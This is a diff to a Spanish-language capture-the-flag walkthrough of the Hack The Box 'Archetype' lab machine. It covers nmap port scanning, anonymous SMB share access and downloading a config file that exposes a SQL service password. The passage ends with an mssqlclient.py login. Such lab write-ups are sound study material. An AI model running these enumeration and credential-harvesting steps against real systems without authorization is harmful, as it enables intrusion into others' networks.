@@ -36,7 +36,7 @@ Procedemos a enumerar todos los puertos abiertos en un escaneo usando los siguie
 Con la funcion de extractPorts: filtramos por los puertos abiertos pasandole el archivo de salida del primer escaneo con Nmap
 
 ```bash
-# extractPorts allports
+"# extractPorts allports"
 
 [*] Extracting information .......
 
@@ -49,7 +49,7 @@ Con la funcion de extractPorts: filtramos por los puertos abiertos pasandole el 
 Procedemos a escanear la version y servicios de los puerto encontrados como abiertos:
 
 ```bash
-nmap -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -oN Target 10.10.10.27
+"nmap -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -oN Target 10.10.10.27"
 ```
 Output:
 
@@ -57,8 +57,8 @@ Output:
 PORT      STATE SERVICE      VERSION
 135/tcp   open  msrpc        Microsoft Windows RPC
 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
-1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+"445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds"
+"1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM"
 | ms-sql-ntlm-info: 
 |   Target_Name: ARCHETYPE
 |   NetBIOS_Domain_Name: ARCHETYPE
@@ -70,10 +70,10 @@ PORT      STATE SERVICE      VERSION
 | Not valid before: 2021-03-16T16:48:45
 |_Not valid after:  2051-03-16T16:48:45
 |_ssl-date: 2021-03-16T17:55:06+00:00; +17m25s from scanner time.
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+"5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)"
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+"47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)"
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 49664/tcp open  msrpc        Microsoft Windows RPC
@@ -118,11 +118,54 @@ Encontramos iformacion util para proseguir con las siguiente herramienta
 Utilizamos la siguiente herramienta para ver si tenemos acceso al servicio samba sin proporcionar contraseña (-N) y ver si hay algun recurso disponible, descargarlo, subir algun archivo etc.
 smbclient
 ```bash
-smbclient -N -L //10.10.10.27/
+"smbclient -N -L //10.10.10.27/"
+   
+   Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+SMB1 disabled -- no workgroup available
 ```
+Idientificamos un directorio llamado BACKUPS al que podemos acceder sin contraseña:
 
+```bash
+"smbclient -N  //10.10.10.27/backups"
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Jan 20 13:20:57 2020
+  ..                                  D        0  Mon Jan 20 13:20:57 2020
+  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020
+
+                10328063 blocks of size 4096. 8255932 blocks available
+smb: \> 
+```
+Listamos si hay algun archivo disponible dentro de "Backups". 
+Probamos a descargar el archivo encontrado. 
+Lo conseguimos descargar correctamente.
+
+```bash
+"smb: \> get prod.dtsConfig"
+getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0,7 KiloBytes/sec) (average 0,7 KiloBytes/sec)
+```
+Le cambiamos de nombre al archivo descargado:
+```bash
+mv prod.dtsConfig datos 
+```
+Leemos el archivo encontrado
+```bash
+<DTSConfiguration>
+    <DTSConfigurationHeading>
+        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
+    </DTSConfigurationHeading>
+    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+        <ConfiguredValue>Data Source=.;"Password=M3g4c0rp123";User ID="ARCHETYPE\sql_svc";Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+    </Configuration>
+</DTSConfiguration>   
+```
 mssqlclient.py
 
 ```bash
-mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+"mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth"
 ```
